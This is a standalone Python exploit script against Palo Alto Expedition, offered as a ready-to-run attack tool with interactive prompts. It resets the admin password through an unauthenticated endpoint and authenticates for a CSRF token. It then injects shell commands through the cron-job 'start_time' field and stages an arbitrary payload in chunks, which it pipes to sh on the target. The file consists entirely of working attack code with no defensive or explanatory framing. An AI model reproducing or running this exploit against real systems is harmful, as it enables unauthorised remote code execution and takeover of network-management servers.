import requests
import random
import string
import time
import json
from urllib.parse import urljoin


class PaloAltoExpeditionExploit:
    def __init__(self, target, username="admin", password="paloalto", reset_admin=False, writable_dir="/tmp/"):
        self.target = target.rstrip("/")
        self.username = username
        self.password = password
        self.reset_admin = reset_admin
        self.writable_dir = writable_dir
        self.session = requests.Session()
        self.csrf_token = None

    def random_string(self, length):
        return ''.join(random.choices(string.ascii_letters, k=length))

    def reset_admin_password(self):
        url = urljoin(self.target, "/OS/startup/restore/restoreAdmin.php")
        response = self.session.post(url)
        if response.status_code == 200 and "Admin password restored to" in response.text:
            restored_password = response.text.split("'")[1]
            self.password = restored_password
            self.username = "admin"
        else:
            raise Exception("Failed to reset admin password.")

    def authenticate(self):
        url = urljoin(self.target, "/bin/Auth.php")
        data = {
            "action": "get",
            "type": "login_users",
            "user": self.username,
            "password": self.password
        }
        response = self.session.post(url, data=data)
        if response.status_code == 200:
            try:
                json_response = response.json()
                self.csrf_token = json_response["csrfToken"]
            except (KeyError, json.JSONDecodeError):
                raise Exception("Failed to retrieve CSRF token.")
        else:
            raise Exception("Authentication failed.")

    def execute_command(self, command):
        url = urljoin(self.target, "/bin/CronJobs.php")
        data = {
            "action": "set",
            "type": "cron_jobs",
            "project": "pandb",
            "name": self.random_string(8),
            "cron_id": 1,
            "recurrence": "Daily",
            "start_time": f'";{command} #'
        }
        headers = {"Csrftoken": self.csrf_token}
        response = self.session.post(url, data=data, headers=headers)
        if response.status_code != 200:
            raise Exception(f"Command execution failed. HTTP code: {response.status_code}")

    def stage_payload(self, payload):
        chunk_size = random.randint(25, 35)
        staging_file = f"{self.writable_dir}/{self.random_string(5)}"
        for i, chunk in enumerate([payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)], 1):
            command = f'echo -n "{chunk}" {" >> " if i > 1 else ">"} {staging_file}'
            self.execute_command(command)
            time.sleep(1)
        self.execute_command(f"cat {staging_file} | sh && rm {staging_file}")

    def exploit(self, payload):
        try:
            if not self.username or not self.password:
                if self.reset_admin:
                    self.reset_admin_password()
                else:
                    raise Exception("Credentials are required. Set reset_admin=True to reset the admin password.")
            self.authenticate()
            self.stage_payload(payload)
        except Exception as e:
            print(str(e))


def main():
    target_url = input("Enter the target URL (e.g., https://target-address): ").strip()
    username = input("Enter the username (default: admin): ").strip() or "admin"
    password = input("Enter the password (default: paloalto): ").strip() or "paloalto"
    reset_admin = input("Do you want to reset the admin password if needed? (yes/no, default: no): ").strip().lower() == "yes"
    writable_dir = input("Enter a writable directory on the target (default: /tmp/): ").strip() or "/tmp/"
    payload = input("Enter the command or payload to execute: ").strip()

    exploit = PaloAltoExpeditionExploit(
        target=target_url,
        username=username,
        password=password,
        reset_admin=reset_admin,
        writable_dir=writable_dir
    )
    exploit.exploit(payload)


if __name__ == "__main__":
    main()
